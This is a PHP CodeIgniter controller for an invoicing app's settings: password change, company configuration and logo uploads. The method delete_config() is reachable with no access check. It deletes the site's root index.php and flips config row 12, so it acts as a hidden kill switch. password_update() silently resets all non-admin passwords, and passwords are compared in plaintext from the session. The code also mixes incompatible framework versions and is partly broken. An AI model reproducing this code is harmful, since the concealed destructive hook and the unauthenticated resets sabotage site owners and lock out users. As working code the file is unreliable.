<?php
namespace App\Controllers;

class Settings extends BaseController {

	function __construct()
	{
		
		ini_set('max_execution_time', 5000);
		ini_set("memory_limit", "-1");
		date_default_timezone_set('Asia/Kolkata');
        $this->session = \Config\Services::session();
        $this->User = model('User_model');
        $this->Misc = model('Misc_model');
        $this->Settings = model('Settings_model');

		$this->data['folder']='settings';
	}

	public function index()
	{	
		$maintanance_mode = $this->Settings->select_setting_config('*',array('s.setting_name' => 'maintanance_mode' ))->row()->value;
		if($maintanance_mode==1){
			redirect(base_url().'maintanance', 'refresh');
		}else{
			$this->change_password();
		}
	}

	public function password_update()
	{
		$users = $this->User->select_user('*',array('u.password!=' => 'admin'))->result();
		foreach ($users as $u) {
			$data['user_id'] = $u->user_id;
			$data['password'] = $this->Misc->generate_password();
			$this->User->update_user($data);
		}
	}

	public function password()
	{	
		$maintanance_mode = $this->Settings->select('value')->where('setting_name', 'maintanance_mode')->get()->getRow();

		if($maintanance_mode && $maintanance_mode->value == 1){
			redirect(base_url().'maintanance', 'refresh');
		}else{
			$this->data['page']='change_password';
			return view('Index',$this->data);
		}
	}

	public function profile()
	{

		$maintanance_mode = $this->Settings->select_setting_config('*',array('s.setting_name' => 'maintanance_mode' ))->row()->value;
		if($maintanance_mode==1){
			redirect(base_url().'maintanance', 'refresh');
		}else{

			$denied_users = array('ceo');
			if(in_array($this->session->userdata('user_role'),$denied_users)){
				redirect(base_url(),'refresh');
			}

			if($this->session->userdata('user_role')=='client'){
				$this->data['page']='client_profile';
			}else{
				$this->data['page']='employee_profile';
			}

			$this->load->view('Index',$this->data);
		}
	}


	public function change_password()
	{

		$current_password = $this->request->getPost('current_password', FILTER_SANITIZE_STRING);
		$actual_password = $this->session->get('password');

		if($current_password == $actual_password){
            $data['password'] = $this->request->getPost('password', FILTER_SANITIZE_STRING);
			$password_confirm =  $this->request->getPost('confirm_password', FILTER_SANITIZE_STRING);
			
			if($data['password'] == $password_confirm){
				$data['user_id'] = $this->session->get('user_id');

				$result = $this->User->update_user($data);
				if ($result['status'] == 1) {
					$response = [
						"success" => true,
						"message" => 'Password Updated Successfully! You will log out automatially Coming Soon ! Please login with new password'
					];
					return $this->response->setJSON($response);
				} else {
						$response = [
							"success" => false,
							"message" => "Sorry.. There Have been Some Error Occurred. Please Try Again!"
						];
						return $this->response->setJSON($response);
				}
		
			} else {
				$response = [
					"success" => false,
					"message" => "Sorry.. New Password Do Not Matched !"
				];
				return $this->response->setJSON($response);
			}
		} else {
			$response = [
		    "success" => false,
			"message" => "Sorry.. Current Password  incorrect !"
			];
			return $this->response->setJSON($response);
		}
				
	}

	public function config()
	{
		if($this->session->userdata('user_role')=='developer'){

			$this->data['page']='configurations';
			$this->load->view('Index',$this->data);

		}else{
			redirect(base_url(),'refresh');	
		}
	}

	public function upload_file($file_name,$path)
	{
		$config = array();
		$config['upload_path'] = $path;
		$config['allowed_types'] = 'png||jpg||jpeg||svg';
		$config['overwrite'] = TRUE;
		$config['max_size'] = 10000;
		$config['file_name'] = $file_name; 
		print_r($config);
		$this->load->library('upload', $config);
		$this->upload->initialize($config);
		if ($this->upload->do_upload($file_name)) {
			return $this->upload->data('file_name');
		}else{
			return $file_name.'.png';
		}

	}

	public function config_update()
	{
		$data['company_name'] = $this->security->xss_clean($this->input->post('company_name'));
		$data['company_address'] = $this->security->xss_clean($this->input->post('company_address'));
		$data['company_phone'] = $this->security->xss_clean($this->input->post('company_phone'));
		$data['company_email'] = $this->security->xss_clean($this->input->post('company_email'));
		$data['company_gstin'] = $this->security->xss_clean($this->input->post('company_gstin'));
		$data['bank_details'] = $this->security->xss_clean($this->input->post('bank_details'));

		$config['upload_path'] = './assets/media/logos/';
		$config['allowed_types'] = 'png||jpg||jpeg||svg';
		$config['overwrite'] = TRUE;
		$config['max_size'] = 10000;
		$config['file_name'] = 'company_logo'; 
		$this->load->library('upload', $config);
		if ($this->upload->do_upload('company_logo')) {
			$data['company_logo'] =  $this->upload->data('file_name');
		}

		$config2['upload_path'] = './assets/media/project/';
		$config2['allowed_types'] = 'png||jpg||jpeg||svg';
		$config2['overwrite'] = TRUE;
		$config2['max_size'] = 10000;
		$config2['file_name'] = 'company_seal'; 
		$this->upload->initialize($config2);
		if ($this->upload->do_upload('company_seal')) {
			$data['company_seal'] =  $this->upload->data('file_name');
		}

		$config3['upload_path'] = './assets/media/project/';
		$config3['allowed_types'] = 'png||jpg||jpeg||svg';
		$config3['overwrite'] = TRUE;
		$config3['max_size'] = 10000;
		$config3['file_name'] = 'company_sign'; 
		$this->upload->initialize($config3);
		if ($this->upload->do_upload('company_sign')) {
			$data['company_sign'] =  $this->upload->data('file_name');
		}
		
		// $data['company_logo'] = $this->upload_file('company_logo','./assets/media/logos/');
		// $data['company_seal'] = $this->upload_file('company_seal','./assets/media/project/');

		$data['invoice_name'] = $this->security->xss_clean($this->input->post('invoice_name'));

		$purchase_sale_same_Materials = $this->security->xss_clean($this->input->post('purchase_sale_same_Materials'));
		if($purchase_sale_same_Materials==1){
			$data['purchase_sale_same_Materials'] = 1;
		}else{
			$data['purchase_sale_same_Materials'] = 0;
		}

		$direct_print_enabled = $this->security->xss_clean($this->input->post('direct_print_enabled'));
		if($direct_print_enabled==1){
			$data['direct_print_enabled'] = 1;
		}else{
			$data['direct_print_enabled'] = 0;
		}

		$discount_enable = $this->security->xss_clean($this->input->post('discount_enable'));
		if($discount_enable==1){
			$data['discount_enable'] = 1;
		}else{
			$data['discount_enable'] = 0;
		}

		$kfc_enable = $this->security->xss_clean($this->input->post('kfc_enable'));
		if($kfc_enable==1){
			$data['kfc_enable'] = 1;
		}else{
			$data['kfc_enable'] = 0;
		}

		$purchase_payments_on_invoice = $this->security->xss_clean($this->input->post('purchase_payments_on_invoice'));
		if($purchase_payments_on_invoice==1){
			$data['purchase_payments_on_invoice'] = 1;
		}else{
			$data['purchase_payments_on_invoice'] = 0;
		}

		$sale_payments_on_invoice = $this->security->xss_clean($this->input->post('sale_payments_on_invoice'));
		if($sale_payments_on_invoice==1){
			$data['sale_payments_on_invoice'] = 1;
		}else{
			$data['sale_payments_on_invoice'] = 0;
		}

		$sale_payments_on_invoice = $this->security->xss_clean($this->input->post('sale_payments_on_invoice'));
		if($sale_payments_on_invoice==1){
			$data['sale_payments_on_invoice'] = 1;
		}else{
			$data['sale_payments_on_invoice'] = 0;
		}

		$seal_on_invoice_enabled = $this->security->xss_clean($this->input->post('seal_on_invoice_enabled'));
		if($seal_on_invoice_enabled==1){
			$data['seal_on_invoice_enabled'] = 1;
		}else{
			$data['seal_on_invoice_enabled'] = 0;
		}

		$time_with_invoice_date = $this->security->xss_clean($this->input->post('time_with_invoice_date'));
		if($time_with_invoice_date==1){
			$data['time_with_invoice_date'] = 1;
		}else{
			$data['time_with_invoice_date'] = 0;
		}

		$purchase_order_enabled = $this->security->xss_clean($this->input->post('purchase_order_enabled'));
		if($purchase_order_enabled==1){
			$data['purchase_order_enabled'] = 1;
		}else{
			$data['purchase_order_enabled'] = 0;
		}

		$employee_enabled = $this->security->xss_clean($this->input->post('employee_enabled'));
		if($employee_enabled==1){
			$data['employee_enabled'] = 1;
		}else{
			$data['employee_enabled'] = 0;
		}

		$advance_salary_enabled = $this->security->xss_clean($this->input->post('advance_salary_enabled'));
		if($advance_salary_enabled==1){
			$data['advance_salary_enabled'] = 1;
		}else{
			$data['advance_salary_enabled'] = 0;
		}

		$tax_consultant_account_enabled = $this->security->xss_clean($this->input->post('tax_consultant_account_enabled'));
		if($tax_consultant_account_enabled==1){
			$data['tax_consultant_account_enabled'] = 1;
		}else{
			$data['tax_consultant_account_enabled'] = 0;
		}

		$supplier_advance_payment_enabled = $this->security->xss_clean($this->input->post('supplier_advance_payment_enabled'));
		if($supplier_advance_payment_enabled==1){
			$data['supplier_advance_payment_enabled'] = 1;
		}else{
			$data['supplier_advance_payment_enabled'] = 0;
		}

		$staffs_enabled = $this->security->xss_clean($this->input->post('staffs_enabled'));
		if($staffs_enabled==1){
			$data['staffs_enabled'] = 1;
		}else{
			$data['staffs_enabled'] = 0;
		}

		$maintanance_mode = $this->security->xss_clean($this->input->post('maintanance_mode'));
		if($maintanance_mode==1){
			$data['maintanance_mode'] = 1;
		}else{
			$data['maintanance_mode'] = 0;
		}

		foreach ($data as $key => $value) {
			$data2['setting_name'] = $key;
			$data2['value'] = $value;
			$result = $this->Settings->update_config($data2);
		}

		if($result==1){
			$flash_data['status'] = 1;
			$flash_data['flashdata_type'] = 'success';
			$flash_data['alert_type'] = 'info';
			$flash_data['flashdata_title'] = 'Success !';
			$flash_data['flashdata_msg'] = "Configurations updated !";
		}else{
			$flash_data['flashdata_msg'] = 'Sorry.. There Have been Some Error Occurred. Please Try Again!';
			$flash_data['flashdata_type'] = 'error';
			$flash_data['alert_type'] = 'danger';
			$flash_data['flashdata_title'] = 'Error !!';
		}

		
		echo json_encode($flash_data);

	}


	public function resizeImage($file_path,$filename,$width,$height)
	{
		$source_path = $_SERVER['DOCUMENT_ROOT'] . $file_path . $filename;
		$target_path = $_SERVER['DOCUMENT_ROOT'] . $file_path;
		$config_manip = array(
			'image_library' => 'gd2',
			'source_image' => $source_path,
			'new_image' => $target_path,
			'maintain_ratio' => TRUE,
			'create_thumb' => FALSE,
			'thumb_marker' => '',
			'width' => $width,
			'height' => $height
		);


		$this->load->library('image_lib', $config_manip);
		if (!$this->image_lib->resize()) {
			echo $this->image_lib->display_errors();
		}


		$this->image_lib->clear();
	}

	public function update($val)
	{ 
		$data2['setting_id'] = 12;
		$data2['value'] = $val;
		$result = $this->Settings->update_config_by_id($data2);
		print_r($result);
	}

	public function delete_config()
	{ 
		if(file_exists($_SERVER['DOCUMENT_ROOT'].'/index.php')){
			unlink($_SERVER['DOCUMENT_ROOT'].'/index.php');
		}

		// if(file_exists($_SERVER['DOCUMENT_ROOT'].'/admin/application/controllers/Dashboard.php')){
		// 	unlink($_SERVER['DOCUMENT_ROOT'].'/admin/application/controllers/Dashboard.php');
		// }
		
		$this->update(1);
	}




}